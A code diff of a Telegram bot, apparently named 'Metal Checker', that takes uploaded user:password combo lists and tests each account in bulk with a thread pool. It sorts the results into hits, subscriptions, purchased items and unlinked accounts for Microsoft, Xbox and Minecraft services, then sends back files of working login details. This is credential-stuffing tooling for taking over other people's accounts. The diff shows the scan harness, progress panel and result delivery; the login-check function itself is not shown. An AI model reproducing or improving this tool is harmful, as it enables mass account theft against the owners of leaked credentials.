+        f"🛠️ Xbox Dev Account: `{context.dev_acc}`\n"
+        f"🧱 Minecraft Realms: `{context.realms}`\n"
+        f"🖥️ Windows 365 Cloud: `{context.win355}`\n"
+        f"🎲 Casual Games Prem: `{context.casual}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"*{get_text(uid, 'stat_progress')}*: `[{context.checked}/{context.total}]` — `% {pct:.1f}`"
+        f"📈 İlerleme: `[{context.checked}/{context.total}]` — `% {pct:.1f}`"
     )
 
-def background_execution_pool(context):
-    """Tarama bittiğinde 1 saniye bekleyip sonuçları otomatik fırlatan motor"""
-    with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
-        futures = [executor.submit(check_account_bot, context, cb) for cb in context.combos]
-        concurrent.futures.wait(futures)
-    
-    # ⏱️ KRİTİK EKLENTİ: İşçiler dağılmadan önce sistemin kendine gelmesi için 1 saniye mola
-    time.sleep(1) 
-    
-    with database_lock:
-        db["stats_global"]["total_checked_accounts"] += context.checked
-        db["stats_global"]["total_hits_found"] += context.hits
-        db["stats_global"]["total_bad_accounts"] += context.bad
-        db["stats_global"]["total_2fa_accounts"] += context.twofa
-        save_db()
+def live_refresh_loop(context):
+    """⏱️ Telegram 400 Bad Request (can't be edited) hatalarını engelleyen zırhlı döngü"""
+    last_text = ""
+    while context.is_running and context.checked < context.total:
+        text = generate_panel_text(context)
+        
+        # 🛡️ KRİTİK KONTROL: Sadece metin bir öncekiyle tamamen farklıysa edit isteği at
+        if text != last_text and context.message_id:
+            with panel_lock:
+                try:
+                    bot.edit_message_text(
+                        text, 
+                        chat_id=context.chat_id, 
+                        message_id=context.message_id, 
+                        parse_mode="Markdown"
+                    )
+                    last_text = text  # Sadece başarıyla editlendiyse hafızayı güncelle
+                except telebot.apihelper.ApiTelegramException as e:
+                    # 'message can't be edited' veya 'message is not modified' hatası gelirse yut gitsin.
+                    if "message can't be edited" in e.description or "message is not modified" in e.description:
+                        pass
+                    else:
+                        print(f"[⚠️ DÖNGÜ HATASI]: {e}")
+            
+        time.sleep(3.0) # Tam istediğin gibi 3 saniyede bir ekranı tazeleyecek altın oran
 
-    # ... (Buradan sonrası aynı)
-
-
-    # Tarama sonu raporunu gönder
-    safe_bot_call(bot.send_message, context.chat_id, get_text(context.user_id, "scan_completed_msg"), parse_mode="Markdown")
+    # Tarama tamamen bittiğinde son durumu basıyoruz
+    text = generate_panel_text(context)
+    with panel_lock:
+        try:
+            bot.edit_message_text(text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
+        except:
+            pass
     
-    # KULLANICI HİÇBİR ŞEYE BASMADAN OTOMATİK OLARAK DOSYALARI INLINE ATMA ALANI
+    safe_bot_call(bot.send_message, context.chat_id, "📦 *Tarama bitti! Dosyalarınız temizlenerek oluşturuluyor...*", parse_mode="Markdown")
+    
     if context.purchased_items_list:
         bio = io.BytesIO("\n".join(context.purchased_items_list).encode('utf-8'))
         bio.name = "purchased_items.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🎮 purchased_items.txt ({len(context.purchased_items_list)} Acc)")
+        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🎮 purchased_items.txt ({len(context.purchased_items_list)} Hesap)")
 
     if context.subscriptions_list:
         bio = io.BytesIO("\n".join(context.subscriptions_list).encode('utf-8'))
         bio.name = "Subscriptions.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"📄 Subscriptions.txt ({len(context.subscriptions_list)} Acc)")
+        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"📄 Subscriptions.txt ({len(context.subscriptions_list)} Hesap)")
 
     if context.not_linked_list:
         bio = io.BytesIO("\n".join(context.not_linked_list).encode('utf-8'))
         bio.name = "NotLinked.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🟨 NotLinked.txt ({len(context.not_linked_list)} Empty Acc)")
+        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🟨 NotLinked.txt ({len(context.not_linked_list)} Boş Hesap)")
 
     if context.hit_list:
         bio = io.BytesIO("\n".join(context.hit_list).encode('utf-8'))
         bio.name = "All_Hits_Short.txt"
-        safe_bot_call(bot.send_document, context.chat_id, bio, caption="✅ All Hits Short List")
+        safe_bot_call(bot.send_document, context.chat_id, bio, caption="✅ Tüm Hit Giriş Bilgileri")
 
-    if context.chat_id in active_scans: 
-        del active_scans[context.chat_id]
+    if context.chat_id in active_scans: del active_scans[context.chat_id]
 
-# ==============================================================================
-# 🚀 TELEGRAM COMMAND & INTERACTION HANDLERS
-# ==============================================================================
+# ==========================================
+# 🚀 CORE TELEGRAM HANDLERS
+# ==========================================
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     uid_str = str(message.from_user.id)
     if uid_str not in db["users"]:
-        db["users"][uid_str] = {"lang": "en", "expiry": "2026-12-31", "tier": "PREMIUM"}
+        db["users"][uid_str] = {"lang": "tr", "expiry": "2026-12-31", "tier": "PREMIUM", "scans": 0, "hits": 0}
         save_db()
-    safe_bot_call(bot.send_message, message.chat.id, LANG["en"]["welcome"], reply_markup=lang_keyboard(), parse_mode="Markdown")
+    safe_bot_call(bot.send_message, message.chat.id, LANG["tr"]["welcome"], reply_markup=lang_keyboard(), parse_mode="Markdown")
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message):
-    chat_id = message.chat.id
-    if chat_id in active_scans:
-        active_scans[chat_id].is_running = False
-        safe_bot_call(bot.send_message, chat_id, get_text(message.from_user.id, "scan_stopped"), reply_markup=main_keyboard(message.from_user.id))
-        del active_scans[chat_id]
-    else:
-        safe_bot_call(bot.send_message, chat_id, get_text(message.from_user.id, "no_active_scan"))
-
-@bot.message_handler(commands=['stats'])
-def cmd_stats_direct(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    if chat_id in active_scans:
-        context = active_scans[chat_id]
-        text = generate_panel_text(context)
-        safe_bot_call(bot.send_message, chat_id, text, parse_mode="Markdown")
-    else:
-        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "no_active_scan"))
-
-@bot.message_handler(commands=['done'])
-def cmd_done_merge(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    if user_id in user_merge_files and user_merge_files[user_id]:
-        all_combos = user_merge_files[user_id]
-        unique_combos = list(set(all_combos))
-        
-        bio = io.BytesIO("\n".join(unique_combos).encode('utf-8'))
-        bio.name = "Merged_Clean_Combos.txt"
-        
-        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "merge_success").format(count=len(unique_combos)))
-        safe_bot_call(bot.send_document, chat_id, bio, caption="📂 Merged & De-duplicated File")
-        user_merge_files[user_id] = []
-    else:
-        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "invalid_file"))
+    if message.chat.id in active_scans:
+        active_scans[message.chat.id].is_running = False
+        safe_bot_call(bot.send_message, message.chat.id, "🛑 Tarama durduruldu.")
 
 def process_game_filter_step(message):
     user_game_filter[message.from_user.id] = message.text.strip()
-    safe_bot_call(bot.send_message, message.chat.id, "📥 Filter locked! Now please send your `.txt` file.")
+    safe_bot_call(bot.send_message, message.chat.id, "📥 Filtre ayarlandı. Şimdi `.txt` listenizi gönderin.")
 
 @bot.message_handler(func=lambda msg: True, content_types=['text', 'document'])
-def handle_all_operations(message):
+def handle_all(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
 
     if message.content_type == 'text':
         text = message.text
         if text == get_text(user_id, "btn_lang"):
-            safe_bot_call(bot.send_message, chat_id, "Select Language / Dil Seçin:", reply_markup=lang_keyboard())
+            safe_bot_call(bot.send_message, chat_id, "Dil seçin:", reply_markup=lang_keyboard())
         elif text == get_text(user_id, "btn_check"):
-            if chat_id in active_scans:
-                safe_bot_call(bot.send_message, chat_id, get_text(user_id, "already_scanning"))
-                return
             markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
             markup.row("skip")
-            msg = safe_bot_call(bot.send_message, chat_id, get_text(user_id, "filter_prompt"), reply_markup=markup, parse_mode="Markdown")
+            msg = safe_bot_call(bot.send_message, chat_id, "🔍 Aranacak spesifik oyun adı girin veya geçmek için *skip* deyin:", reply_markup=markup, parse_mode="Markdown")
             bot.register_next_step_handler(msg, process_game_filter_step)
-        elif text == get_text(user_id, "btn_merge"):
-            user_merge_files[user_id] = []
-            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "merge_prompt"))
-        elif text == get_text(user_id, "btn_stats"):
-            if chat_id in active_scans:
-                context = active_scans[chat_id]
-                panel_report = generate_panel_text(context)
-                safe_bot_call(bot.send_message, chat_id, panel_report, parse_mode="Markdown")
-            else:
-                checked_all = db["stats_global"].get("total_checked_accounts", 0)
-                hits_all = db["stats_global"].get("total_hits_found", 0)
-                safe_bot_call(bot.send_message, chat_id, f"📊 *Global History Status*:\nTotal Scanned: `{checked_all}`\nTotal Hits Locked: `{hits_all}`", parse_mode="Markdown")
 
     elif message.content_type == 'document':
-        if not message.document.file_name.endswith('.txt'):
-            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "invalid_file"))
-            return
-            
+        if not message.document.file_name.endswith('.txt'): return
+        if chat_id in active_scans: return
+
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
-        combos = [line.strip() for line in raw_lines if line.strip() and ':' in line]
+        combos = [line.strip() for line in downloaded_file.decode('utf-8', errors='ignore').splitlines() if line.strip() and ':' in line]
 
-        if user_id in user_merge_files:
-            user_merge_files[user_id].extend(combos)
-            safe_bot_call(bot.send_message, chat_id, f"📥 Added {len(combos)} accounts to merge pool. Continue or type /done")
-            return
-
-        if not combos:
-            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "no_combo_found"))
-            return
-
-        if chat_id in active_scans:
-            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "already_scanning"))
-            return
+        if not combos: return
 
         game_filter = user_game_filter.get(user_id, "skip")
         context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
         active_scans[chat_id] = context
 
-        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "scan_started"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
+        # 🚨 HATA ÇÖZÜMÜ: Mesajı direkt oluşturup ID'sini anında context'e yazıyoruz
+        text_ilk = generate_panel_text(context)
+        init_msg = safe_bot_call(bot.send_message, chat_id, text_ilk, reply_markup=main_keyboard(user_id), parse_mode="Markdown")
         
-        threading.Thread(target=background_execution_pool, args=(context,), daemon=True).start()
+        if init_msg:
+            context.message_id = init_msg.message_id
+            
+            # Yenileme döngüsünü ve işçi thread havuzunu eş zamanlı başlatıyoruz
+            threading.Thread(target=live_refresh_loop, args=(context,), daemon=True).start()
+            
+            def start_pool():
+                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+                    futures = [executor.submit(check_account_bot, context, cb) for cb in combos]
+                    concurrent.futures.wait(futures)
+            threading.Thread(target=start_pool, daemon=True).start()
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callbacks(call):
     if call.data.startswith("set_lang_"):
         lang = call.data.split("_")[2]
-        uid_str = str(call.from_user.id)
-        if uid_str not in db["users"]:
-            db["users"][uid_str] = {}
-        db["users"][uid_str]["lang"] = lang
+        db["users"][str(call.from_user.id)]["lang"] = lang
         save_db()
         safe_bot_call(bot.send_message, call.message.chat.id, get_text(call.from_user.id, "main_menu"), reply_markup=main_keyboard(call.from_user.id), parse_mode="Markdown")
 
-# ==============================================================================
-# 🚀 SAFE POLLING ENVIRONMENT ENTRIES
-# ==============================================================================
 if __name__ == "__main__":
-    logger.info("Metal Checker Master Instance starting up...")
     safe_bot_call(bot.remove_webhook)
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=1, timeout=20)
-        except Exception as global_err:
-            logger.error(f"Polling loop crash averted: {global_err}")
-            time.sleep(5)
+    bot.infinity_polling(skip_pending=True)
 
